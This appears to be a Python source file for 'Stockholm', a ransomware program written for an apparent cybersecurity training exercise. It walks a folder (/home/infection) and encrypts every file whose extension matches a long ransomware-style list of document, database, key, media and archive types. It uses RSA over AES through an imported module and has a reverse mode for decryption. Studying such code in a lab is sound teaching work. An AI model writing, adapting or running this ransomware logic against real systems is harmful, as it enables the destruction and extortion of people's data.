import argparse, os, string
from krypt import alloc
from secrets import choice

def arg_parser():
    try:
        argv_parser = argparse.ArgumentParser(
            prog="Stockholm",
            description='./stockholm A program to encrypt the contents of the files in a folder',
            epilog='Piscina Cyberseguridad - smagniny',
        )
        argv_parser.add_argument('-v', '--version', help='Shows the version of the program', action="store_true")
        argv_parser.add_argument('-r', '--reverse', help='Reverse the infection !', action="store")
        argv_parser.add_argument('-s', '--silent', help='The program will not produce any output', action="store_true")
        argv = argv_parser.parse_args()

        return argv.version, argv.reverse, argv.silent
    except Exception as E:
        print(str(E))

class Stockholm:
    '''
    Clase que representa el programa Stockholm, encargado de cifrar los archivos en una carpeta utilizando AES y RSA.
    permite generar llaves AES y RSA, exportarlas e importarlas, y cifrar los archivos en la carpeta especificada.
    '''
    default_version = "1.0.0"
    default_route ="/home/infection"
    default_extension = "ft"
    _target_extensions = (
        '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
        '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
        '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
        '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db',
        '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo',
        '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
        '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp',
        '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv',
        '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2',
        '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef',
        '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd',
        '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk',
        '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx',
        '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks',
        '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost',
        '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx',
        '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
        '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
    )

    def __init__(self, version=False, reverse=False, silent=False):
        self.version = version
        self.reverse = reverse
        self.silent = silent
        self.krypt = alloc()

    def get_extension(self, index=None):
        """
        Recupera las extensiones objetivo.
        
        Args:
            index (int, optional): Índice específico. Si es None, devuelve todas.
        
        Returns:
            tuple o str: Tupla completa de extensiones o una extensión específica.
        
        Raises:
            IndexError: Si el índice está fuera de rango.
        """
        if index is None:
            return self._target_extensions
        return self._target_extensions[index]

    def stockholm(self):
        list_files = os.listdir(self.default_route)
        for file in list_files:
            if file.endswith(self.get_extension()):
                self.krypt.encrypt_data_RSA_OVER_AES(self.default_route, file)

    def paris(self, reverse_path=None):
        list_files = os.listdir(self.default_route)
        
        for file in list_files:
            if file.endswith(self.get_extension()):
                self.krypt.decrypt_data_RSA_OVER_AES(self.default_route, file, reverse_path)

if __name__ == "__main__":
    version, reverse, silent = arg_parser()

    goodware = Stockholm(version, reverse, silent)

    if goodware.reverse:
        goodware.paris(reverse)
    else:
        goodware.krypt.generar_llaves_rsa()
        #goodware.krypt.save_session("session.enc", "m4st3rpassw0rd")
        goodware.stockholm()

#tAtADdKBpAQSZcHagTUbvtecUNiToBGl

